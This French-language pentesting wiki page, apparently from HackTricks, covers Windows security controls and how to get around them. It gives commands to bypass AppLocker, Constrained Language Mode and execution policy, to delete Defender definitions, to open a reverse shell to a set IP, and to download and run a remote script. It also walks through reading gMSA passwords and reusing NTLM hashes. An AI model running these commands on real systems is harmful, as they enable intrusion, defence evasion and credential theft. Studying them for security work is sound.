# Contrôles de sécurité Windows

{{#include ../../banners/hacktricks-training.md}}

## Politique AppLocker

Une liste blanche d'applications est une liste de logiciels ou d'exécutables approuvés autorisés à être présents et exécutés sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants et les logiciels non approuvés qui ne correspondent pas aux besoins métier spécifiques d'une organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la solution Microsoft pour la mise en liste blanche d'applications et donne aux administrateurs système le contrôle sur **quelles applications et quels fichiers les utilisateurs peuvent exécuter**. Il fournit un **contrôle granulaire** sur les exécutables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.  
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifier quels fichiers/extensions sont sur liste noire/liste blanche :
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ce chemin du registre contient les configurations et les politiques appliquées par AppLocker, offrant un moyen de vérifier l'ensemble des règles actuellement appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Utiles **Writable folders** pour bypass AppLocker Policy : si AppLocker permet d'exécuter n'importe quoi dans `C:\Windows\System32` ou `C:\Windows`, il existe des **Writable folders** que vous pouvez utiliser pour **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Des binaires [**"LOLBAS's"**](https://lolbas-project.github.io/) couramment **de confiance** peuvent également être utiles pour contourner AppLocker.
- **Des règles mal rédigées peuvent aussi être contournées**
- Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
- Les organisations se concentrent souvent sur **le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** en raison de la charge supplémentaire que cela peut imposer au système, et du volume de tests nécessaires pour s'assurer que rien ne casse. Ainsi, utiliser des **DLLs comme portes dérobées aidera à contourner AppLocker**.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'infos, voir : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Stockage des identifiants

### Gestionnaire des comptes de sécurité (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe y sont hachés.

### Autorité de sécurité locale (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour des raisons d'authentification unique.\
**LSA** administre la **politique de sécurité** locale (politique de mot de passe, permissions des utilisateurs...), **l'authentification**, les **jetons d'accès**...\
C'est LSA qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et qui **communicatera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **identifiants** sont **enregistrés** dans le **processus LSASS** : tickets Kerberos, hashs NT et LM, mots de passe facilement décryptables.

### Secrets LSA

LSA peut enregistrer sur le disque certains identifiants :

- Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes des services Windows
- Mots de passe des tâches planifiées
- Plus (mot de passe des applications IIS...)

### NTDS.dit

C'est la base de données de l'Active Directory. Elle est présente uniquement sur les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** des outils pentesting courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier **l'état** de **Defender** vous pouvez exécuter le cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l'énumérer, vous pouvez aussi exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Système de fichiers chiffré (EFS)

EFS protège les fichiers par chiffrement en utilisant une **clé symétrique** connue sous le nom de **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le flux de données alternatif $EFS du fichier chiffré. Lorsqu'une décryption est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer la FEK depuis le flux $EFS. Plus de détails sont disponibles [ici](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scénarios de déchiffrement sans action de l'utilisateur** incluent :

- Lorsque des fichiers ou dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant transmission.

Cette méthode de chiffrement permet un **accès transparent** aux fichiers chiffrés pour le propriétaire. Cependant, simplement changer le mot de passe du propriétaire et se connecter ne permet pas de déchiffrer les fichiers.

Points clés :

- EFS utilise une FEK symétrique, chiffrée avec la clé publique de l'utilisateur.
- La décryption utilise la clé privée de l'utilisateur pour accéder à la FEK.
- Un déchiffrement automatique se produit dans des conditions spécifiques, comme la copie vers FAT32 ou la transmission réseau.
- Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.

### Vérifier les infos EFS

Vérifier si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifier **qui** a **accès** au fichier en utilisant cipher /c \<file\>  
Vous pouvez aussi utiliser `cipher /e` et `cipher /d` dans un dossier pour **chiffrer** et **déchiffrer** tous les fichiers

### Déchiffrement des fichiers EFS

#### En tant que SYSTEM

Cette méthode nécessite que l'utilisateur victime exécute un processus sur l'hôte. Si c'est le cas, en utilisant une session `meterpreter` vous pouvez usurper le token du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pouvez simplement `migrate` vers le processus de l'utilisateur.

#### Connaître le mot de passe de l'utilisateur


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft a développé les **Group Managed Service Accounts (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures informatiques. Contrairement aux comptes de service traditionnels qui ont souvent l'option "**Password never expire**" activée, les gMSA offrent une solution plus sécurisée et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères qui change automatiquement selon la politique du domaine ou de l'ordinateur. Ce processus est géré par le Key Distribution Service (KDC) de Microsoft, éliminant le besoin de mises à jour manuelles du mot de passe.
- **Sécurité renforcée** : ces comptes sont immunisés contre les verrouillages et ne peuvent pas être utilisés pour des connexions interactives.
- **Support multi-hôtes** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour des services exécutés sur plusieurs serveurs.
- **Capacité pour les tâches planifiées** : contrairement aux managed service accounts, les gMSA prennent en charge l'exécution de tâches planifiées.
- **Simplification de la gestion des SPN** : le système met automatiquement à jour le Service Principal Name (SPN) lorsqu'il y a des modifications des attributs sAMaccount de l'ordinateur ou du nom DNS, simplifiant la gestion des SPN.

Les mots de passe des gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont réinitialisés automatiquement tous les 30 jours par les Domain Controllers (DCs). Ce mot de passe, un blob de données chiffrées connu sous le nom de [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par les administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant un environnement sécurisé. Pour accéder à cette information, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

Dans de nombreux environnements, des utilisateurs à faible privilège peuvent pivoter vers les secrets gMSA sans compromettre le DC en abusant des ACL d'objet mal configurées :

- Un groupe que vous pouvez contrôler (p. ex., via GenericAll/GenericWrite) se voit accorder `ReadGMSAPassword` sur un gMSA.
- En vous ajoutant à ce groupe, vous héritez du droit de read le blob `msDS-ManagedPassword` du gMSA via LDAP et de dériver des credentials NTLM utilisables.

Flux de travail typique :

1) Découvrez le chemin avec BloodHound et marquez vos foothold principals comme Owned. Recherchez des edges comme :
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Ajoutez-vous au groupe intermédiaire que vous contrôlez (exemple avec bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lire le mot de passe gMSA géré via LDAP et dériver le hash NTLM. NetExec automatise l'extraction de `msDS-ManagedPassword` et la conversion en NTLM :
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) S'authentifier en tant que gMSA en utilisant le NTLM hash (aucun plaintext nécessaire). Si le compte est dans Remote Management Users, WinRM fonctionnera directement :
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- Les lectures LDAP de `msDS-ManagedPassword` nécessitent sealing (e.g., LDAPS/sign+seal). Les outils gèrent cela automatiquement.
- Les gMSAs sont souvent dotés de droits locaux comme WinRM ; validez l'appartenance aux groupes (e.g., Remote Management Users) pour planifier les mouvements latéraux.
- Si vous avez seulement besoin du blob pour calculer vous-même le NTLM, voyez la structure MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La Local Administrator Password Solution (LAPS), disponible en téléchargement depuis [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe Administrator locaux. Ces mots de passe, qui sont **randomized**, uniques, et **regularly changed**, sont stockés centralement dans Active Directory. L'accès à ces mots de passe est restreint via des ACLs aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la possibilité de lire les mots de passe Administrator locaux est fournie.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, comme le blocage des COM objects, l'autorisation uniquement des .NET types approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.

### **Vérifier**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Sur les versions actuelles de Windows ce contournement ne fonctionne pas, mais vous pouvez utiliser[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **de** _**Ajouter une référence**_ -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet en .Net4.5**.

#### Contournement direct :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner le constrained mode. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Politique d'exécution PS

Par défaut, elle est définie sur **restricted.** Principales méthodes pour contourner cette politique :
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Plus d'informations disponibles [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface Security Support Provider (SSPI)

Est l'API permettant d'authentifier les utilisateurs.

Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui veulent communiquer. La méthode privilégiée pour cela est Kerberos. Ensuite, le SSPI négociera quel protocole d'authentification sera utilisé ; ces protocoles d'authentification sont appelés Security Support Provider (SSP), sont présents dans chaque machine Windows sous forme de DLL et les deux machines doivent supporter le même pour pouvoir communiquer.

### Principaux SSPs

- **Kerberos** : Le préféré
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2** : Pour des raisons de compatibilité
- %windir%\Windows\System32\msv1_0.dll
- **Digest** : serveurs Web et LDAP, mot de passe sous forme de hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel** : SSL et TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant celui par défaut)
- %windir%\Windows\System32\lsasrv.dll

#### La négociation peut proposer plusieurs méthodes ou une seule.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui affiche une **invite de consentement pour les activités nécessitant des privilèges élevés**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
